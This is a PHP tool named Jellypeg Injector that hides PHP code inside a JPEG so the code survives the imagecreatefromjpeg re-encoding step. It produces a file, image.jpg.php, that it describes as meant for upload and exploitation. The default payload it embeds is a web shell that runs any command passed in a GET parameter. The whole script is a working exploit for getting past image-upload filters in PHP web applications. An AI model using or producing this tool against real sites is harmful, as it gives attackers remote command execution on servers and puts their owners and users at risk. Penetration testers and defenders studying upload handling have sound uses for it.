<?php
#Title: Tool to inject code into JPEG that has been stuffed through imagecreatefromjpeg in PHP
#Author: Jinny Ramsmark
#Github: https://github.com/jra89/Jellypeg
#Usage: php jellypeg.php
#Output: image.jpg.php is the file to be used for upload and exploitation
#Requires: php, php-gd

#This script assumes no special transforming is done on the image for this specific CVE.
#It can be modified however for different sizes and so on (x,y vars).

ini_set('display_errors', 1);
error_reporting(E_PARSE);

echo "-=Jellypeg Injector 1.9=-\n";
echo "[+] Usage: php jellypeg.php <width> <height> <quality> <code>\n";
echo "[+] Example: php jellypeg.php 100 100 75 '<?=exec(\$_GET[\"c\"])?>'\n";

//Argue(ment) about stuff, I dunno, I thought it was funny
$width = isset($argv[1]) && is_numeric($argv[1]) ? $argv[1] : '100';
$height = isset($argv[2]) && is_numeric($argv[2]) ? $argv[2] : '100';
$quality = isset($argv[3]) && is_numeric($argv[3]) && $argv[3] <= 100 ? $argv[3] : '75';
$code = isset($argv[4]) ? $argv[4 ] : '<?=exec($_GET["c"])?>';
$orig = 'image.jpg';
$base_url = "http://placekitten.com";
 
do
{
    $url = $base_url . "/$width/$height/";
 
    echo "[+] Fetching image ($width X $height) from $url\n";
    file_put_contents($orig, file_get_contents($url));
} while(!tryInject($orig, $code, $quality));
 
echo "[+] Done\n";
echo "[+] Result file: image.jpg.php\n";
 
function tryInject($orig, $code, $quality)
{
    $result_file = 'image.jpg.php';
    $tmp_filename = $orig . '_mod2.jpg';
    
    //Create base image and load its data
    $src = imagecreatefromjpeg($orig);

    imagejpeg($src, $tmp_filename, $quality);
    $data = file_get_contents($tmp_filename);
    $tmpData = array();

    echo "[+] Jumping to end byte\n";
    $start_byte = findStart($data);
 
    echo "[+] Searching for valid injection point\n";
    for($i = strlen($data)-1; $i > $start_byte; --$i)
    {
        $tmpData = $data;
        for($n = $i, $z = (strlen($code)-1); $z >= 0; --$z, --$n)
        {
            $tmpData[$n] = $code[$z];
        }
 
        $src = imagecreatefromstring($tmpData);
        imagejpeg($src, $result_file, $quality);
 
        if(checkCodeInFile($result_file, $code))
        {
            unlink($tmp_filename);
            unlink($result_file);
            sleep(1);
 
            file_put_contents($result_file, $tmpData);
 
            sleep(1);
            $src = imagecreatefromjpeg($result_file);
 
            return true;
        }
        else
        {
            unlink($result_file);
        }
    }
        unlink($orig);
        unlink($tmp_filename);
        return false;
}
 
function findStart($str)
{
    for($i = 0; $i < strlen($str); ++$i)
    {
        if(ord($str[$i]) == 0xFF && ord($str[$i+1]) == 0xDA)
        {
            return $i+2;
        }
    }
 
    return -1;
}
 
function checkCodeInFile($file, $code)
{
    if(file_exists($file))
    {
        $contents = loadFile($file);
    }
    else
    {
        $contents = "0";
    }
 
    return strstr($contents, $code);
}
 
function loadFile($file)
{
    $handle = fopen($file, "r");
    $buffer = fread($handle, filesize($file));
    fclose($handle);
 
    return $buffer;
}